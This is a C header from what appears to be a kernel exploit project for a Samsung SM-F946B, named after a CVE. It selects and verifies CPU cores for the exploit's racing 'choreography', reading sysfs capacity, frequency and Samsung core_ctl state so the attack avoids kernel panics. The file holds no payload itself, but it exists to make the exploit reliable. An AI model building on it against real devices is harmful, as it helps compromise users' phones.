/*
 * Core discovery for the choreography pair (ported from the reference
 * exploit's 00_cpu_discovery.c).
 *
 * WHY THIS REPLACED THE HARDCODED {5,4,3}/{6,5,4,3} LISTS
 * --------------------------------------------------------
 * util.c used to walk a hardcoded preference list and accept a core on the
 * strength of a single trial sched_setaffinity(). A trial pin only proves
 * the syscall was ACCEPTED. It says nothing about whether the core is a
 * legal place to be when the kernel consumes our forged state a few
 * microseconds later, and it ranks nothing: cpu5 was preferred over cpu3
 * purely because 5 appeared first in an array.
 *
 * On SM-F946B (SM8550-class, WALT) cpu5/cpu6 are exactly the cores Samsung's
 * core_ctl flips between "Paused" and "Not preferred" while it migrates work
 * off them. Pinning the critical choreography there invites mid-attempt CPU
 * theft, and CPU theft during the choreography is a kernel panic -- util.c's
 * own comment records a ~50% panic from exactly that.
 *
 * THE POLICY (verbatim from the reference, including its quirks)
 * -------------------------------------------------------------
 *  1. sched_getaffinity() ONCE, used only as a filter intersection. It is
 *     never widened and never treated as a ranking input.
 *  2. /sys/devices/system/cpu/cpuN/cpu_capacity            -> primary key,
 *     higher is better.
 *  3. /sys/devices/system/cpu/cpuN/cpufreq/cpuinfo_max_freq -> first tiebreak,
 *     higher is better. (affinity.h's frequency clustering is deliberately
 *     NOT reused here: it clusters by distinct frequency, which throws away
 *     the capacity ordering the OEM actually cares about. cpuinfo_max_freq
 *     is only ever read as a tiebreak, never as a filter.)
 *  4. LOWEST cpu index -> final tiebreak.
 *  5. Samsung core_ctl is a hard filter. Every core's state is published in
 *     ONE flat text blob that is readable from ANY single
 *     /sys/devices/system/cpu/cpuN/core_ctl/global_state node, so we open the
 *     first one that works and parse " CPU: %d", " Paused: %d" and
 *     " Not preferred: %d". A core counts as "known" only if BOTH Paused and
 *     Not preferred were seen for it; unknown cores are never filtered.
 *  6. FAIL OPEN: if core_ctl is unreadable every core stays unknown, the
 *     paused/not-preferred filter is inert, and we degrade to plain
 *     affinity + capacity instead of refusing to run. Only a hard affinity
 *     wall removes a core.
 *  7. PIN AND VERIFY: after sched_setaffinity the caller must additionally see
 *     sched_getcpu() == cpu and a FRESH core_ctl read of that cpu still
 *     reporting not-paused/not-not-preferred. A trial-pin acceptance is not a
 *     verification.
 *
 * Note the reference's `cpu < best_cpu` final tiebreak is unreachable (the
 * scan runs ascending, so best_cpu is always < cpu). It is reproduced anyway
 * so this file stays a faithful port rather than a paraphrase.
 */
#ifndef CVE43499_CORE_CTL_H
#define CVE43499_CORE_CTL_H

#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>

#ifndef CORE_CTL_MAX_CPUS
#define CORE_CTL_MAX_CPUS 1024
#endif

/* Only the top N ordered candidates are retained. The ranking scan still walks
 * every allowed cpu (so the order is the true global order), but the stored
 * list is capped: the choreography consumes exactly TWO of them, and keeping
 * 1024 entries would put ~32 KB of struct on the caller's stack. */
#ifndef CORE_CTL_MAX_CANDIDATES
#define CORE_CTL_MAX_CANDIDATES 16
#endif

/* Per-core Samsung core_ctl verdict. `known` is 0 whenever the blob could not
 * be read or the core did not appear in it, which is what makes the filter
 * fail open. */
struct core_ctl_cpu_state {
  unsigned char known;
  unsigned char paused;
  unsigned char not_preferred;
};

/* One candidate plus the evidence behind it, so a run's choice is auditable
 * from the device log alone. */
struct core_rank {
  int cpu;
  int usable; /* survived the affinity intersection and the core_ctl filter */
  long capacity;
  long max_frequency_khz;
  struct core_ctl_cpu_state state;
};

/* Ordered candidate list, best first. `count` may be 0. */
struct core_selection {
  int count;
  int core_ctl_readable;
  int have_capacity;
  struct core_rank rank[CORE_CTL_MAX_CANDIDATES];
};

/* Read one integer sysfs attribute of a cpu. Returns 1 on success. */
static inline int core_ctl_read_long(int cpu, const char *name, long *out) {
  char path[192];
  int len = snprintf(path, sizeof(path), "/sys/devices/system/cpu/cpu%d/%s",
                     cpu, name);
  *out = -1;
  if (len <= 0 || (size_t)len >= sizeof(path)) {
    return 0;
  }
  FILE *f = fopen(path, "re");
  if (!f) {
    return 0;
  }
  int ok = fscanf(f, "%ld", out) == 1;
  fclose(f);
  return ok;
}

/*
 * Parse the flat core_ctl blob. Samsung publishes the state of EVERY core from
 * ANY one cpuN/core_ctl/global_state node, so the first readable node is
 * authoritative for the whole topology; there is no need to read N files and
 * no need to guess which cpu is representative.
 *
 * A core is marked `known` only when both its "Paused:" and its
 * "Not preferred:" lines were seen. Anything else -- unreadable blob, truncated
 * blob, core absent from the blob -- leaves known == 0 and therefore usable.
 */
static inline int core_ctl_parse_states(struct core_ctl_cpu_state *states,
                                        size_t state_count) {
  FILE *file = NULL;
  char path[192];
  int cpu;

  for (cpu = 0; cpu < state_count && cpu < CPU_SETSIZE; cpu++) {
    int len = snprintf(path, sizeof(path),
                       "/sys/devices/system/cpu/cpu%d/core_ctl/global_state",
                       cpu);
    if (len <= 0 || (size_t)len >= sizeof(path)) {
      continue;
    }
    file = fopen(path, "re");
    if (file) {
      break;
    }
  }
  if (!file) {
    return 0;
  }

  int current_cpu = -1;
  unsigned char saw_paused[CORE_CTL_MAX_CPUS];
  unsigned char saw_not_preferred[CORE_CTL_MAX_CPUS];
  memset(saw_paused, 0, sizeof(saw_paused));
  memset(saw_not_preferred, 0, sizeof(saw_not_preferred));

  char line[192];
  while (fgets(line, sizeof(line), file)) {
    int value;
    if (sscanf(line, " CPU: %d", &value) == 1) {
      current_cpu =
          (value >= 0 && (size_t)value < state_count) ? value : -1;
      continue;
    }
    if (current_cpu < 0 || current_cpu >= CORE_CTL_MAX_CPUS) {
      continue;
    }
    if (sscanf(line, " Paused: %d", &value) == 1) {
      states[current_cpu].paused = value != 0;
      saw_paused[current_cpu] = 1;
    } else if (sscanf(line, " Not preferred: %d", &value) == 1) {
      states[current_cpu].not_preferred = value != 0;
      saw_not_preferred[current_cpu] = 1;
    }
  }
  fclose(file);

  int known = 0;
  for (size_t i = 0; i < state_count; i++) {
    states[i].known = (saw_paused[i] && saw_not_preferred[i]) ? 1 : 0;
    known += states[i].known != 0;
  }
  return known;
}

/* Populate one core's evidence. Re-reads core_ctl, so it is also the
 * "did this core become paused since we pinned it" check. */
static inline void core_ctl_probe_cpu(int cpu,
                                      struct core_ctl_cpu_state *state,
                                      struct core_rank *out) {
  struct core_ctl_cpu_state states[CORE_CTL_MAX_CPUS];
  memset(states, 0, sizeof(states));
  (void)core_ctl_parse_states(states, CORE_CTL_MAX_CPUS);

  memset(out, 0, sizeof(*out));
  out->cpu = cpu;
  (void)core_ctl_read_long(cpu, "cpu_capacity", &out->capacity);
  (void)core_ctl_read_long(cpu, "cpufreq/cpuinfo_max_freq",
                           &out->max_frequency_khz);
  if (cpu >= 0 && cpu < CORE_CTL_MAX_CPUS) {
    out->state = states[cpu];
  }
  *state = out->state;
}

/* "Stable" in the reference's sense: unknown cores are stable by definition,
 * which is exactly the fail-open property. */
static inline int core_ctl_cpu_stable(const struct core_ctl_cpu_state *s) {
  return !s->known || (!s->paused && !s->not_preferred);
}

/*
 * Build the ordered candidate list.
 *
 * sched_getaffinity() is read exactly once, here, and used only as a filter.
 * The ranking key is cpu_capacity when any candidate reports one (this is the
 * reference's `have_capacity` switch) and cpuinfo_max_freq otherwise, so a
 * device with no cpu_capacity nodes degrades to plain frequency ranking rather
 * than to a fixed list.
 *
 * Returns the number of usable candidates, or 0 when the affinity mask is
 * empty. Never returns a core outside the cpuset.
 */
static inline int core_ctl_rank_candidates(struct core_selection *sel) {
  memset(sel, 0, sizeof(*sel));

  cpu_set_t allowed;
  if (sched_getaffinity(0, sizeof(allowed), &allowed) != 0) {
    return 0;
  }

  struct core_ctl_cpu_state states[CORE_CTL_MAX_CPUS];
  memset(states, 0, sizeof(states));
  sel->core_ctl_readable = core_ctl_parse_states(states, CORE_CTL_MAX_CPUS) > 0;

  /* have_stable mirrors the reference: if at least one allowed core is
   * core_ctl-clean we are allowed to filter the rest out; if the OEM has
   * paused every single allowed core we do NOT additionally refuse to run. */
  int have_stable = 0;
  for (int cpu = 0; cpu < CPU_SETSIZE && cpu < CORE_CTL_MAX_CPUS; cpu++) {
    if (!CPU_ISSET(cpu, &allowed)) {
      continue;
    }
    if (core_ctl_cpu_stable(&states[cpu])) {
      have_stable = 1;
    }
    long capacity = -1;
    if (core_ctl_read_long(cpu, "cpu_capacity", &capacity)) {
      sel->have_capacity = 1;
    }
  }

  int best_cpu = -1;
  long best_capacity = -1;
  long best_frequency = -1;

  for (int cpu = 0; cpu < CPU_SETSIZE && cpu < CORE_CTL_MAX_CPUS; cpu++) {
    if (!CPU_ISSET(cpu, &allowed)) {
      continue;
    }
    if (have_stable && !core_ctl_cpu_stable(&states[cpu])) {
      continue;
    }
    long capacity = -1;
    long frequency = -1;
    (void)core_ctl_read_long(cpu, "cpu_capacity", &capacity);
    (void)core_ctl_read_long(cpu, "cpufreq/cpuinfo_max_freq", &frequency);

    long metric = sel->have_capacity ? capacity : frequency;
    long best_metric = sel->have_capacity ? best_capacity : best_frequency;
    if (best_cpu < 0 || metric > best_metric ||
        (metric == best_metric && frequency > best_frequency) ||
        (metric == best_metric && frequency == best_frequency &&
         cpu < best_cpu)) {
      best_cpu = cpu;
      best_capacity = capacity;
      best_frequency = frequency;
    }
  }
  if (best_cpu < 0) {
    return 0;
  }

  /* Reproduce the chosen order as a full list so a PAIR can be picked from it:
   * the ranking key is re-applied to every survivor, best first. */
  for (;;) {
    int next_cpu = -1;
    long next_capacity = -1;
    long next_frequency = -1;
    for (int cpu = 0; cpu < CPU_SETSIZE && cpu < CORE_CTL_MAX_CPUS; cpu++) {
      if (!CPU_ISSET(cpu, &allowed)) {
        continue;
      }
      if (have_stable && !core_ctl_cpu_stable(&states[cpu])) {
        continue;
      }
      int taken = 0;
      for (int i = 0; i < sel->count; i++) {
        if (sel->rank[i].cpu == cpu) {
          taken = 1;
          break;
        }
      }
      if (taken) {
        continue;
      }
      long capacity = -1;
      long frequency = -1;
      (void)core_ctl_read_long(cpu, "cpu_capacity", &capacity);
      (void)core_ctl_read_long(cpu, "cpufreq/cpuinfo_max_freq", &frequency);
      long metric = sel->have_capacity ? capacity : frequency;
      long best_metric = sel->have_capacity ? next_capacity : next_frequency;
      if (next_cpu < 0 || metric > best_metric ||
          (metric == best_metric && frequency > next_frequency) ||
          (metric == best_metric && frequency == next_frequency &&
           cpu < next_cpu)) {
        next_cpu = cpu;
        next_capacity = capacity;
        next_frequency = frequency;
      }
    }
    if (next_cpu < 0 || sel->count >= CORE_CTL_MAX_CANDIDATES) {
      break;
    }
    struct core_rank *slot = &sel->rank[sel->count++];
    slot->cpu = next_cpu;
    slot->usable = 1;
    slot->capacity = next_capacity;
    slot->max_frequency_khz = next_frequency;
    slot->state = states[next_cpu];
  }
  return sel->count;
}

#endif
